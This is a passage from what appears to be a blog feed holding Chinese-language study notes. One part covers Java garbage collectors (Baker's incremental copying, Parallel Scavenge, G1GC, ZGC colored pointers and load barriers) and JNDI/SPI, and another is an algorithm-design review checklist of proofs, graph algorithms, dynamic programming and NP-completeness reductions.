GC，染成黑色-灰色的结点；</p></li></ul><p>于是，我们基于 Copy Collection 的 Cheney’s Algorithm 实现一个 Incremental Collection 算法 (read)：<strong><u>Baker’s Algorithm</u></strong>；</p><p>基本前提：应用（mutator）和 GC（collector）处于同一线程中；</p><p>定时策略：仅 allocate memory 时交互进行；</p><p><img src="imgs/gc-baker-algo.png" width="250px" /></p><p>仍然把 heap 分为 from-space 和 to-space 两个部分；</p><p>GC 过程仍然从堆内存满了后开始，但不是一次性做完，而是每次 allocation 时增量地做一点；步骤如下：</p><ol><li><p>当堆（from-space）满后，交换二者角色，现在 from-space 变成空的一边；并且立即 forward root 结点到 from-space；</p><p><img src="imgs/gc-baker-flip.png" width="250px" /></p></li><li><p>第一步结束后，不继续复制，而是先退出 GC 例程，回到应用（有点像协程 coroutine）；当应用在 GC 例程暂停期间 allocate 堆时，会再次唤醒 GC，此时：</p><ul><li><p>会直接分配在空的 from-space 的末端（减小 limit 的指针位置）；</p><p><img src="imgs/gc-baker-alloc.png" width="250px" /></p></li><li><p>对应的扫描并从 to-space 中复制已分配记录（注意，如果分配了 N bytes 空间，那么从 to-space 扫描的大小不小于 N bytes，为了 copy 的过程不慢于应用分配的速度）。注意 forwarding pointers；</p><p><img src="imgs/gc-baker-incr-scan.png" width="250px" /></p></li></ul></li><li><p>第一步结束后，如果应用在 GC 例程暂停期间 load references，创建了指向 to-space entry（这个 entry 是没有被复制到 from-space 过的）的 root 结点，那么根据 tricolor marking 理论，此时 to-space 中未被复制到 from-space 的 entries 全是白结点（没有被 GC 遍历过），这相当于直接将黑结点指向白结点（违反 invariant 1）。我们立即做一次 forward（但不关心它内部的 forwarding pointers）：</p><p><img src="imgs/gc-baker-load1.png" width="550px" /></p><p>如果指向的 to-space entry 是已被复制的，那么立即 forward：</p><p><img src="imgs/gc-baker-load2.png" width="550px"/></p></li><li><p>当 <code>scan</code> 碰上 <code>next</code> 时，allocation 结束，本轮 GC 再次暂停，控制权又回到应用；</p><p>只要保证 $R\lt\dfrac{1}{4}H$，在上述过程中就不会出现 GC 扫描时 from-space 用完的情况；</p></li></ol><p>总结一下 incremental collection 的优缺点：</p><ul><li>优点：时延低，把复制的操作均摊到每次 allocation 时，减小了单次的 STW 时长，对 real-time app（例如浏览器/端侧设备渲染、游戏应用等等）友好；</li><li>缺点：总体开销很大，每次 read 都多两条指令（compare &amp; jump）；性能开销高出 20%（而且还没有考虑 locality）；</li></ul><h2 id="8-7-Concurrent-Collection"><a href="#8-7-Concurrent-Collection" class="headerlink" title="8.7 Concurrent Collection"></a>8.7 Concurrent Collection</h2><p>之前我们讨论的是同步 GC，有没有异步 GC 呢？有的。就像前面说的，无论如何都需要 STW 来同步信息，只不过 STW 的长短罢了。在并行 GC 中，STW 的大部分工作都在 synchronization 中；</p><p>这里全部展开的话篇幅过长，我们按下不表，在后面讨论 Java 的并行 GC 的算法时再作介绍。</p><h2 id="8-8-Parallel-Scanvenge-Java"><a href="#8-8-Parallel-Scanvenge-Java" class="headerlink" title="8.8 Parallel Scanvenge (Java)"></a>8.8 Parallel Scanvenge (Java)</h2><p>一个内存密集型设计比较成功的语言。因此 Java 的 GC 设计的比较成熟。</p><p>2010 年左右的时间，Java 8 默认使用的是 <strong><u>Parallel Scavenge (PS)</u></strong> 这种 GC 策略。</p><p>定时策略：某个 semi-space 满了后；</p><p>它其实也是一种 Generation GC 的策略（stop-copy-compact，也有 STW 存在）。不过 Parallel Scavenge 对于新代和旧代的 GC 算法是不同的。总体结构如下：</p><p><img src="imgs/gc-modern-java-arch.png" width="350px" /></p><p>注意到，Young Generation（新代）中存在 3 个 semi space:   Eden、From、To，使用 Minor GC 算法如下：</p><ol><li>Application allocate 空间时向 Eden 区域直接插入；</li><li>Eden-space 满了后，从 root 遍历复制 reachable records 到 to-space；</li><li>当 Eden-space 再次满了/ to-space 满了后，同时从 root 遍历复制 reachable records 到 from-space；<ul><li>其中在 to-space 中存活 <code>K</code> 轮的 records，会被 promote 到 old generation(s) 中；</li></ul></li><li>在一轮复制结束后，如果 from-space 快满了，则交换 to-space 和 from-space 的身份；</li></ol><p><img src="imgs/gc-java-minor.png" /></p><p>Minor GC 如何并行与 Application 执行（parallel execution）？</p><ul><li>Reference Tracking；</li><li>Copy Race（Queue &amp; CAS）；</li><li>Work Stealing；</li></ul><p>对于旧代（Old Generation）使用 Full/Major GC 算法：</p><blockquote><p>一般要执行 Full GC，那么这时可能剩余内存已经不多了。</p></blockquote><ul><li><p>Marking:   Mark all live objects;</p></li><li><p>Summary:   Calculate new address for live objects;</p><blockquote><p>先算出地址，而不是上来就 copy，方便后面的 compaction；</p></blockquote></li><li><p>Compact:   Move objects and update references;</p><blockquote><p>需要考虑一个问题，如果 destination 也是 source 呢？</p></blockquote></li></ul><p><img src="imgs/gc-java-major.png"/></p><p>PS 这种策略也有些缺陷，例如空间是连续的（难以 split/adjust/reorganize），并且比例固定（在 VM 启动后固定）：</p><p>而且 Minor GC（4 GB ~）一般在 100ms 左右，Major GC （16 GB ~）一般多于 1s。</p><p>为了改进这个问题，我们可以：</p><ul><li><p>将 heap 的结构从 space 改成 regions（分块，smaller, segregated regions）：</p></li><li><p>Also including young and old spaces:   Adding a middleground between old and young，这被称为 <strong><u>Mixed GC</u></strong>；</p><p><img src="imgs/gc-java-mixed.png" width="350px" /></p></li><li><p>Collection set: including all regions to be collected；</p><p><img src="imgs/gc-java-collection-set.png" width="250px" /></p></li></ul><p>当然，Parallel Scanvenge 有很强的特点，就是它是吞吐量垃圾收集器（Throughput Collector），它的设计目标是最大化应用程序的吞吐量。也就是说它适用于<strong><u>对吞吐量要求较高</u></strong>的应用程序，例如适合批处理任务或后台处理任务。</p><h2 id="8-9-G1GC-Java"><a href="#8-9-G1GC-Java" class="headerlink" title="8.9 G1GC (Java)"></a>8.9 G1GC (Java)</h2><p>Garbage First GC（G1GC）主要也是采用了 Generation GC 的思想，不过具体细节有些改动。</p><p>它将 Heap 分成 3 个部分，有点类似之前的 Parallel Scanvenge + Mixed GC 改进 + Collection Set 改进：</p><ul><li><strong>Eden:</strong> This is where newly created objects are allocated.</li><li><strong>Survivor:</strong> There are typically two Survivor regions (S0 and S1), and they are used to  hold objects that have survived one or more garbage collection cycles.</li><li><strong>Old Generation:</strong> This region is used to hold long-lived objects that have survived multiple garbage collection cycles.</li></ul><p>这里这篇文章描述的比较好，可以看看：<a href="https://medium.com/@perspectivementor/how-g1-garbage-collector-work-in-java-e468a94ebed6">How G1GC Work in Java</a>；</p><p>算法则主要分为 3 个阶段：</p><ul><li>标记阶段，即从 Roots References 开始，标记活跃对象；<ul><li>此阶段一开始寻找 root 时需要 STW，不过因为数量很少，因此时间较短；</li><li>然后需要遍历 reachable graph，此时是 concurrent mark，因此不需要 STW；</li></ul></li><li>转移阶段，即把活跃对象复制到新的内存地址上；</li><li>重定位阶段，因为转移导致对象的地址发生了变化，在重定位阶段，所有指向对象旧地址的指针都要调整到对象新的地址上。</li></ul><p>这里我们重点关注 G1GC 针对 Young GC 和 Mixed GC 的算法上，其主要流程如下：</p><p><img src="imgs/gc-java-g1gc.png" width="550px" /></p><p>此外，除了 Mixed GC 调整年轻代和年老代的回收阈值、heap 的分区收集结构，以及更强的并发能力以外，G1GC 还提供了<strong>预测性暂停时间</strong> 的特性，可以通过设置目标暂停时间（Pause Time Goal）来控制垃圾收集的暂停时间。</p><p>最后，G1GC 是<u>为多核处理器和大内存系统设计的</u>，旨在替代 CMS（Concurrent Mark-Sweep，注意到历史原因）的并发垃圾收集器（也是 Concurrent GC 的一种）。</p><h2 id="8-10-ZGC-Java"><a href="#8-10-ZGC-Java" class="headerlink" title="8.10 ZGC (Java)"></a>8.10 ZGC (Java)</h2><p>这是 Java 中的一个更新的 GC 机制。它在 Java 11 中实验性使用，在 Java 15 及以后可以正式作为生产环境的一种选择了。</p><p>ZGC 致力于提供尽可能短的 STW 时间。它的目标是：</p><ul><li>STW 时间不超过 10 ms；</li><li>STW 时间不会随着堆的大小，或者活跃对象的大小而增加；</li><li>支持 8 MB~4 TB 级别的堆（未来支持 16 TB）。</li></ul><p>这主要是想匹配服务器应用程序的使用场景。因为在服务器应用程序中，大堆很常见（通常程序运行时间更长、运行的守护进程更多），而且需要快速的应用程序响应时间。</p><p>ZGC 有两种算法，一种是 Generational 的（分代），这个和前面 G1GC 以及 Parallel Scanvenge 比较相似，能够利用到分代的好处（吞吐量上升和更低的时延）；也有一种是 non-generational 的，主要是考虑到禁用分代后可以对某些使用场景进行运行时性能优化。这里我们为了简便，就讨论 non-generational 的实现。下面我们将不分代的 ZGC 单独称为 “ZGC”；</p><p>与 G1GC 的 Mixed GC 和 Young GC 类似，ZGC 也是采用标记然后复制的算法，不过 ZGC 对这部分的算法做了重大改进：ZGC 在标记、转移和重定位阶段几乎都是并发的。ZGC 垃圾回收周期如下图所示：</p><p><img src="imgs/gc-java-zgc.png" width="550px" /></p><p>注意到 “初始标记” 就是我们在 G1GC 中讨论的，标记 root references，需要 STW、不能并发，不过时间很短。</p><h3 id="Tricky-Things"><a href="#Tricky-Things" class="headerlink" title="Tricky Things"></a>Tricky Things</h3><p>ZGC通过着色指针和读屏障技术，解决了转移过程中准确访问对象的问题，实现了并发转移。大致原理描述如下：并发转移中“并发”意味着GC线程在转移对象的过程中，应用线程也在不停地访问对象。假设对象发生转移，但对象地址未及时更新，那么应用线程可能访问到旧地址，从而造成错误。而在ZGC中，应用线程访问对象将触发“读屏障”，如果发现对象被移动了，那么“读屏障”会把读出来的指针更新到对象的新地址上，这样应用线程始终访问的都是对象的新地址。那么，JVM是如何判断对象被移动过呢？就是利用对象引用的地址，即着色指针。下面介绍着色指针和读屏障技术细节。</p><h4 id="References-Coloring"><a href="#References-Coloring" class="headerlink" title="References Coloring"></a>References Coloring</h4><blockquote><p>着色指针是一种将信息存储在指针中的技术。</p></blockquote><p>ZGC 仅支持 64 位系统，它把 64 位虚拟地址空间划分为多个子空间，如下图所示：</p><p><img src="imgs/gc-java-zgc-area.png" width="550px" /></p><p>其中，<code>[0~4TB)</code> 对应 Java 堆，<code>[4TB ~ 8TB)</code> 称为 <code>M0</code> 地址空间，<code>[8TB ~ 12TB)</code> 称为 <code>M1</code> 地址空间，<code>[12TB ~ 16TB)</code> 预留未使用，<code>[16TB ~ 20TB)</code> 称为 <code>Remapped</code> 空间。</p><p>当应用程序创建对象时，首先在堆空间申请一个虚拟地址，但该虚拟地址并不会映射到真正的物理地址。ZGC 同时会为该对象在 M0、M1 和 Remapped 地址空间分别申请一个虚拟地址，且这三个虚拟地址对应同一个物理地址，但这三个空间在同一时间有且只有一个空间有效。ZGC 之所以设置三个虚拟地址空间，是因为它使用“空间换时间”思想，去降低 GC 停顿时间。“空间换时间”中的空间是虚拟空间，而不是真正的物理空间。后续章节将详细介绍这三个空间的切换过程。</p><p>与上述地址空间划分相对应，ZGC 实际仅使用 64 位地址空间的第 0~41 位，而第 42~45 位存储元数据，第 47~63 位固定为 0。</p><p><img src="imgs/gc-java-zgc-pointer.png" width="550px" /></p><p>ZGC 将对象存活信息存储在 42~45 位中，这与传统的垃圾回收（例如 Reference Count）并将对象存活信息放在对象头中的策略是不相同的。</p><h4 id="Load-Barriers"><a href="#Load-Barriers" class="headerlink" title="Load Barriers"></a>Load Barriers</h4><blockquote><p>读屏障是 JVM 向应用代码插入一小段代码的技术。当应用线程从堆中读取对象引用时，就会执行这段代码。需要注意的是，仅“从堆中读取对象引用”才会触发这段代码。</p></blockquote><p>读屏障示例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> obj.FieldA;    <span class="comment">// 从堆中读取引用，需要加入屏障</span></span><br><span class="line">&lt;Load barrier&gt;</span><br><span class="line"><span class="type">Object</span> <span class="variable">p</span> <span class="operator">=</span> o;            <span class="comment">// 无需加入屏障，因为不是从堆中读取引用</span></span><br><span class="line">o.dosomething();        <span class="comment">// 无需加入屏障，因为不是从堆中读取引用</span></span><br><span class="line"><span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span>  obj.FieldB;    <span class="comment">//无需加入屏障，因为不是对象引用</span></span><br></pre></td></tr></table></figure><p>ZGC 中读屏障的代码作用：在对象标记和转移过程中，用于确定对象的引用地址是否满足条件，并作出相应动作。</p><h2 id="8-11-Summary"><a href="#8-11-Summary" class="headerlink" title="8.11 Summary"></a>8.11 Summary</h2><p>总的来说，虽然垃圾收集器的技术在不断进步，但直到现在还没有最好的收集器出现，因为不存在“万能”的收集器，<u>只有适合某些使用场景的垃圾回收器</u>。</p><h1 id="Chapter-9-JDNI-amp-SPI"><a href="#Chapter-9-JDNI-amp-SPI" class="headerlink" title="Chapter 9. JDNI &amp; SPI"></a>Chapter 9. JDNI &amp; SPI</h1><p>Java Oracle Doc 一目了然：</p><p>Java Naming and Directory Interface (JNDI) 是一个应用程序编程接口 (API)，为使用 Java 编程语言编写的应用程序提供命名和目录功能。它的定义独立于任何特定的目录服务实现。因此，各种目录，无论新的、正在出现的和已经部署的，都可以用一种通用的方式访问。</p><p>而 JNDI 体系结构包括一个 API 和一个服务提供商接口 (SPI)。Java 应用程序使用 JNDI API 访问各种命名和目录服务。SPI 使各种命名和目录服务能以透明方式插入，从而允许使用 JNDI API 的 Java 应用程序访问它们的服务。</p><p><img src="imgs/jndi-arch.gif" /></p><p>补充：什么是 SPI？</p><p>SPI 即 Service Provider Interface ，字面意思就是：“服务提供者的接口”，我的理解是：专门提供给服务提供者或者扩展框架功能的开发者去使用的一个接口。</p><p>SPI 将服务接口和具体的服务实现分离开来，将服务调用方和服务实现者解耦，能够提升程序的扩展性、可维护性。修改或者替换服务实现并不需要修改调用方。</p><p>SPI 和 API 有什么区别吗？下面一个图就能弄清楚：</p><p><img src="imgs/spi-vs-api.png" width="350px" /></p><ul><li>当实现方提供了接口和实现，我们可以通过调用实现方的接口从而拥有实现方给我们提供的能力，这就是 <strong>API</strong>。这种情况下，接口和实现都是放在实现方的包中。调用方通过接口调用实现方的功能，而不需要关心具体的实现细节。</li><li>当接口存在于调用方这边时，这就是 <strong>SPI</strong> 。由接口调用方确定接口规则，然后由不同的厂商根据这个规则对这个接口进行实现，从而提供服务。</li></ul><p>补充：SPI 出现的原因是？</p><p>面向对象设计鼓励模块间基于接口而非具体实现编程，以降低模块间的耦合，遵循依赖倒置原则，并支持开闭原则（对扩展开放，对修改封闭）。然而，直接依赖具体实现会导致在替换实现时需要修改代码，违背了开闭原则。为了解决这个问题，SPI 应运而生，它提供了一种服务发现机制，允许在程序外部动态指定具体实现。这与控制反转（IoC）的思想相似，将组件装配的控制权移交给了程序之外（IoC 比较著名的例子就是 Spring Framework）。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Chapter-7-Java-Concurrent&quot;&gt;&lt;a href=&quot;#Chapter-7-Java-Concurrent&quot; class=&quot;headerlink&quot; title=&quot;Chapter 7. Java Concurrent&quot;&gt;&lt;/a&gt;Chapter 7.</summary>
      
    
    
    
    <category term="technical" scheme="https://blog.sjtuxhw.top/categories/technical/"/>
    
    
    <category term="Programming" scheme="https://blog.sjtuxhw.top/tags/Programming/"/>
    
    <category term="Java" scheme="https://blog.sjtuxhw.top/tags/Java/"/>
    
    <category term="GC" scheme="https://blog.sjtuxhw.top/tags/GC/"/>
    
    <category term="Concurrent" scheme="https://blog.sjtuxhw.top/tags/Concurrent/"/>
    
  </entry>
  
  <entry>
    <title>算法设计知识点自查表</title>
    <link href="https://blog.sjtuxhw.top/review/algo-desgin-table/"/>
    <id>https://blog.sjtuxhw.top/review/algo-desgin-table/</id>
    <published>2024-12-31T14:47:03.000Z</published>
    <updated>2025-01-18T15:03:36.201Z</updated>
    
    <content type="html"><![CDATA[<ol><li><p>四则运算、$\mathbf{Z}_N$ 下四则运算+幂运算复杂度；</p></li><li><p>欧几里得 GCD 递归复杂度证明；</p></li><li><p>拓展欧几里得算法求乘法逆元；</p></li><li><p>利用同余性质推算大数能否被整除；</p></li><li><p>费马小定理完整证明；</p></li><li><p>非 Carmichael 合数的费马测试证明；</p></li><li><p>对称加密、非对称加密、证书；</p></li><li><p>大师定理；</p></li><li><p>比较排序的时间下界证明（$n!$ 如何确定两边界？）；</p></li><li><p>快选算法在 25%-75% 判据下的时间复杂度；</p></li><li><p>矩阵算法、计数逆序（及拓展）时间复杂度推导、算法设计；</p></li><li><p>有向图中，有自环等价于存在回边的证明；</p></li><li><p>DAG 中，最大 post number 意味着源点、最小 post number 意味着汇点；</p><blockquote><p>证明 DAG 中，至少有一个源点和一个汇点；</p></blockquote></li><li><p>普通有向图中，最大 post number 意味着位于源点强连通部件内。但最小 post number 没有特性；</p></li><li><p>记忆：任何有向图的嵌图都是 DAG；</p></li><li><p>$G$ 中的源点强连通部件是 $G^R$ 中的汇点强连通部件；</p></li><li><p>证明：</p><ul><li><p>DFS explore 子过程若从 $u$ 开始，必然以 $u$ 及其所有可达结点遍历结束后结束（反证）；</p></li><li><p>$G$ 的两个不同的强连通部件 $C_1,C_2$，如果有从 $C_1$ 到 $C_2$ 的边，则 $C_1$ 的最大 post number 大于 $C_2$ 的最大 post number（不是所有），证明时讨论遍历开始的位置；</p></li><li>同第 14 条；</li></ul></li><li><p>线性时间查找有向图强连通部件算法；</p></li><li><p>问题：</p><ul><li>线性时间找到有向图中能到达其他所有顶点的点（如果不存在需要指出）；</li><li>线性时间判断无向图是否为二部图：证明使用着色法；</li><li>线性时间判断有向图是否存在奇数个顶点的环：<strong><u>每个强连通子图</u></strong>上 DFS 二染色。对回边（好理解）/ 前向边 / 交叉边（如果强连通部件中从 $u$ 到 $v$ 间有两条道路，并且这两条道路奇偶数不同，因为违反染色规则了所以不同。则必然存在一个奇数环和一个偶数环）违反规则的情况认为是含有奇数顶点的环；</li><li>线性时间找 DAG 中从指定顶点 $u$ 到 $v$ 的路径数目：从 $u$ DFS 遍历时，遇到无论什么边，只要是指向 $v$ 的，都让计数加一；</li><li>线性时间判断 DAG 中的 Hamilton 路径的存在性：修改线序化算法。每次检查是否有多于一个入度为 0 的结点，如果是就不存在。</li></ul></li><li><p>lemma：BFS 过程中，<strong>对每个 $d\in\mathbf{N}$，都总存在一个时刻，使得</strong>：</p><ul><li>所有与 $s$ 间距小于等于 $d$ 的顶点都被<strong><u>正确地</u></strong>设置了距离；</li><li>其他顶点的距离都还未被设置（$+\infty$）;</li><li>队列中只含有与 $s$ 间距为 $d$ 的顶点；</li></ul></li><li><p>分析 d-堆、二叉堆、数组作为 Dijkstra 算法的优先级队列时的时间复杂度情况；</p></li><li><p>Dijkstra 算法：</p><ul><li>所有结点初始化距离为 $\infty$，只有源点是 0；然后对所有结点构建优先级队列；</li><li>在队列不空时循环出队：<ul><li>出队 $u$ 时，更新相邻结点距离。如果更小就覆盖（此举会改变相邻点在优先级队列中的位置），并且维护最短路径列表 <code>pre[]</code>（如果需要）；</li></ul></li></ul><p>时间复杂度：$|V|$ 次删除、$|V|+|E|$ 次 <code>decreaseKey</code>；</p></li><li><p>证明 Dijkstra 算法正确性：归纳假设</p><p><img src="imgs/dijkstra-proof.png" width="250px" /></p><ul><li><p>预设：对于一个图 $G$，设定源点 $s$，希望测量的目标点 $v$，假定算法运行时已经设定距离（完整更新一轮邻居后的结果）的结点的集合为 $S$。下面对 $S$ 的大小与算法正确性归纳；</p></li><li><p>奠基：$|S|=1$ 的情况显然算法正确（$s$ 的最短距为 0）；</p></li><li><p>假设：假设对于 $|S|\ge1$ 的情况算法都是正确的；</p></li><li><p>归纳：进行下一轮邻居更新时，设更新到的结点 $v$ 将被加入 $S$，设 $(u,v)$ 是最后一条边。则 $s$ 至 $u$ 的最短路径一定位于 $S$ 中（算法正确性保证），记为 $dist[u]$，我们只需要证明 $dist[u]+l(u,v)$ 比其他任何 $s$ 到 $v$ 间的路径都短就行。</p><ul><li><p>假设 $(x,y)$ 是新一轮迭代中第一条边（最有可能更短），并且 $y$ 到 $v$ 右边。我们记 $s$ 到 $x$ 的路径为 $p^\prime$，则：</p><p>$l(p^\prime)+l(x,y)\ge dist[u]+l(x,y)\ge dist[y]\ge dist[v]$；</p><blockquote><p>注意到，如果存在负边权，$dist[y]\ge dist[v]$ 不再成立，因为可能 $l(y,v)$ 是个绝对值很大的负数。</p><p>这个时候如果需要更新 $v$，发现 $v$ 已经被弹出去了，没法更新了，因此 Dijkstra 算法在负权下不再是正确的了。</p></blockquote></li></ul></li></ul></li><li><p>Bellman-Ford 算法：</p><ul><li>从源点开始，<u>同时地更新一次</u>（不能把这轮更新的信息用来更新其他结点）每条边的两端点的距离信息；</li><li>重复上述动作 $|V|-1$ 次；</li></ul><p>时间复杂度 $O(|V||E|)$；</p></li><li><p>证明为何 Bellman-Ford 算法只需要重复更新 $|V|-1$ 次：</p><ul><li>因为从源点 $s$ 到任意一点 $t$ 的最短路径 $s\rightarrow v_1\rightarrow v_2\rightarrow\cdots\rightarrow v_k\rightarrow t$ 最多包含了 $|V|-1$ 个顶点（这条用反证法）。</li><li>更新了 $|V|-1$ 次后，即便再多的更新都是安全的（$\min$ 不会变大），并且不会缺漏（顶点不会移除）；</li></ul></li><li><p>如何检测负环？让 Bellman-Ford 算法在运行 $|V|-1$ 次后再进行一次，如果还有顶点的距离在变化，则说明有负环。</p></li><li><p>可以含负权的 DAGs 的单元最短路径算法：先拓扑排序，再按线序顺序更新结点的距离信息；</p><p>时间复杂度：$O(|V|)$；</p></li><li><p>问题：</p><ul><li><p>强连通图的某点 $v_0$ 通过的边全部是正权的。找任意两点间的最短路，要求必须经过 $v_0$；</p><blockquote><p>先求 $v_0$ 为源的到各点的最短距离，然后 $dist(u,v_0)+dist(v_0,v)$；</p></blockquote></li><li><p>无向正权图中有一条边 $e_0$，求含 $e_0$ 的最短环的长度；</p><blockquote><p>设 $e_0=(u,v)$，在 $G-e_0$ 中执行 Dijkstra 算法找到 $u$ 到 $v$ 的最短距离，加上 $l(e_0)$ 即可；</p></blockquote></li><li><p>有向正权图的最短环？</p><blockquote><p>环是由 $u$ 到 $v$ 和 $v$ 到 $u$ 的路径拼接而成。</p><p>先求每两个点间的最短路径（数组数据结构 $O(|V|^3)$），在遍历查找 $dist(u,v)+dist(v,u)$ 最小值；</p></blockquote></li><li><p>有向正权图中最简最长路径？</p><blockquote><p>NP Hard 问题；可以将 Hamilton 图问题规约到这个问题。</p></blockquote></li><li><p>无向正权图的最短环？</p><blockquote><p>遍历所有边，每轮循环时删除当前边，并且选取一端运行 Dijkstra 算法。如果另一端是可达的（不是 $\infty$，记为 $c_i$），那么说明原图中存在一个长度为 $c_i+l(e)$ 的环。遍历找长度最小的那个。</p></blockquote></li><li><p>无向等权图中指定两点间最短路径数量？</p><blockquote><p>BFS 使用两个队列。类似 copy collection，最终在队列 1 中找到与 $u$ 相邻的结点终止。然后统计队列中还有哪些与 $u$ 相邻的结点。其数量即为所求。</p><p>这个方法的原理是利用 BFS 的性质（参见第 20 条 lemma）：在每轮结束后队列中放的是相同长度的结点（分开放能确保下一轮的结点不会混入当前队列中）。</p></blockquote></li></ul></li><li><p>证明 $|V|-1=|E|$ 的<u>无向连通图</u>等价于树数据结构；</p><ul><li><p>必要性：归纳。对顶点归纳的话，就是 $k$ 个顶点推 $k+1$ 个；对边归纳的话，就是向 $n$ 个顶点中加边看连通部件数是否减为 1；</p></li><li><p>充分性：反证。假设不是树，则必然存在环，重复去环得到 $|E^\prime|\lt|E|$，由必要性可知 $|E^\prime|=|V|-1=|E|$，矛盾；</p></li></ul></li><li><p>证明一个无向图是一棵树 当且仅当 任意两结点间有一条唯一路径；</p><ul><li>充分性：反证。如果不是就有环，违反定义；</li><li>必要性：先判断是连通图，再反证。假设存在环，则存在两个结点间路径不唯一，矛盾；</li></ul></li><li><p>Kruskal：向顶点中加尽可能小的边，成环就舍去。直至加够 $|V|-1$ 条；</p></li><li><p>割定理：割集间的最短边一定在最小生成树中：分类讨论 + 反证法；</p></li><li><p>Prim：顶点割集 + 顶点的策略。正确性由割定理保证；</p></li><li><p>上色算法求 MST：破圈（染红没有红边的环）、闭圈（染蓝没有蓝边的割边集合中最短边）；</p></li><li><p>证明贪婪算法作为近似算法求解 set cover 问题的近似比为 $\ln n$（设 $n_t$ 是 $t$ 轮选取后剩下的顶点数）；</p></li><li><p>01 背包和完全背包问题的状态转移方程、边界条件（出口）、时空复杂度；</p></li><li><p>多重背包问题（不含二进制优化）算法设计以及时间复杂度分析；</p></li><li><p>硬币找零问题最优解算法；</p></li><li><p>子序列系列问题：</p><ul><li>最长递增子序列：构造 DAG 再动归边；</li><li>最长公共子序列、最长公共子串；</li><li>分治法和动态规划分别求解 最大连续子序列（即子串）和（为什么讨论以 $a_i$ 结尾的子串？子串更适合这种方法！）；</li></ul></li><li><p>三分问题的状态转移方程；</p></li><li><p>Shortest Reliable Path Lite：经过不超过指定边数的最短路径问题；</p><blockquote><p>和 Shortest Reliable Path 的 NP-Complete 问题不一样；</p><p>详情参见第 50 条；</p></blockquote></li><li><p>矩阵乘法最优分配：化归为二叉树，动归二叉树代价；</p></li><li><p>动态规划尝试解决 TSP 问题算法；</p></li><li><p>线性时间找出树的 independent set 大小：分类讨论，孙子结点可以在、儿子结点只能替代；</p></li><li><p>棋子放置问题：模式、相容 与动态规划；</p></li><li><p>DP 难题：</p><p><img src="imgs/dp-nb.png" /></p><p>假设 $M[i,j,p,q]$ 表示对子串 $s[i]\sim s[j]$ 分割，涉及分割点在数组中 $d[p]\sim d[q]$，分割后的最小代价；</p><p>状态转移方程：$M[i,j,p,q]=j-i+1+\min\limits_{p\le k\le q}\{M[i,d[k],p,k]+M[d[k]+1,j,k+1,q]\}$；</p><p>算法复杂度 $O(m^2n^2)$；</p><p><img src="imgs/dp-nb2.png" /></p><p>设在 $x\times y$ 的布料上制作前 $i$ 个产品的最大价值为 $P(i,x,y)$，则状态转移方程为：</p><script type="math/tex; mode=display">\left\{\begin{aligned}P_h(i,x,y)&=\max\{P(i-1,x,y),c_i+P(i,x-a_i,y)+P(i,x,y-b_i)+P(i,x-a_i,y-b_i)\}\\P_v(i,x,y)&=\max\{P(i-1,x,y),c_i+P(i,x-b_i,y)+P(i,x,y-a_i)+P(u,x-b_i,y-a_i)\}\\P(i,x,y)&=\max\{P_h(i,x,y),P_v(i,x,y)\}\end{aligned}\right.</script><p>主要注意到布料是可以旋转使用的！因此分为旋转后再裁剪（$P_v$）和不旋转直接裁剪（$P_h$）两种手段。</p></li><li><p>规范型线性规划转对偶式；</p></li><li><p>单纯形算法时间复杂度推导 $O(n(m+n)C_{m+n}^n)$；</p></li><li><p>单纯形算法求解多元线性规划；</p></li><li><p>最大流问题变式：</p><ul><li>含有多个源点和汇点的最大流问题：定义新的源点和汇点；</li><li>每个顶点有流量限制：将每个顶点拆成两个，这两个顶点间用一条有向边连接，容量就是限制。转换成普通最大流问题；</li><li>每条边在容量的基础上添加限制，要求流量不得低于某个限制。或者某些节点间存在流量损耗：直接规约成一般线性规划问题；</li></ul></li><li><p>瓶颈边（增大会导致总流增大）、临界边（减小会导致总流减小）：注意它们俩是不一样的！！</p></li><li><p>查找临界边：</p><ul><li><p>剩余图中只有反向边的；</p></li><li><p>但也不全是。可能某条在最大流中流满的边，其容量下降后，最大流中缺少的流量可以从其他边的流量得到补充。通过在剩余图中 DFS 能通过的这些反向边就不是临界边，排除它们即可。</p></li></ul></li><li><p>证明：二部图的最小顶点覆盖能够被规约为最大流问题。</p></li><li><p>边不相交问题（化归为最大流问题，需要证明）；</p></li><li><p>常见 NP-Complete 问题规约：</p><ul><li>稠密子图问题（a 个顶点中至少 b 条边）：$b=\dfrac{a(a-1)}{2}$，从最大团问题规约；</li><li>稀疏子图问题（a 个顶点中至多 b 条边）：$b = 0$，从最大独立集问题规约；</li><li>集合覆盖问题：从顶点覆盖规约（子问题，一个元素只会同时存在于两个集合中）；</li><li>子图同构问题（G 能否只通过删除一些点、边，修改名称来得到 H）：从哈密顿回路规约（构造图 G 是一个 N 元环，N 为输入图的顶点数）；</li><li>最大公共子图（同时删除 G 和 H 一些点和对应边，使二者相同，预算 b）：从最大独立集规约；</li><li>哈密顿回路、哈密顿道路相互规约；</li><li>最长初级路径（simple longest path）：从哈密顿路径规约；</li><li>K-Coloring 问题：从 3-SAT 问题规约（构建 OR-gadget 和 Clause gadget）；</li><li>可靠网络问题（shortest reliable path，给定顶点、距离矩阵(边权)、连接需求(重边数量)、预算，构建一个总代价不超过预算、两点间的不同路径数等于对应连接需求的图）：从 TSP 问题规约（预算 $b=n$，距离矩阵全为 1 或 2，表示有边和没有边，连接需求全为 2，表示在环上）；</li></ul></li><li><p>近似算法解决 NP 问题：</p><ul><li>贪婪算法求解集合覆盖问题。近似比 $ln n$；</li><li>极大匹配算法（贪婪选取尽可能多的 endpoints 的边，然后删除共享 endpoints 的边）求解顶点覆盖问题。近似比 2；</li><li>贪婪算法求解 k-clustering 问题：先任取一个点作为第一个中心，然后每次取离当前点最远的，中垂线分割。近似比为 2；</li><li>MST + skip 近似 metric-space-TSP 问题：近似大小不大于最小生成树长度两倍。而最优解不不小于最小生成树长度。因此近似比为 2；</li><li>rescale value 近似背包问题：缩小 $\hat{v_i}=\dfrac{n}{\varepsilon v_{\max}}$，总价值 $\sum v_i\ge\sum\hat{v_i}=K^\star(1-\varepsilon)$，即近似比为用户指定的任意接近；</li></ul></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;ol&gt;
&lt;li&gt;&lt;p&gt;四则运算、$&#92;mathbf{Z}_N$ 下四则运算+幂运算复杂度；&lt;/p&gt;
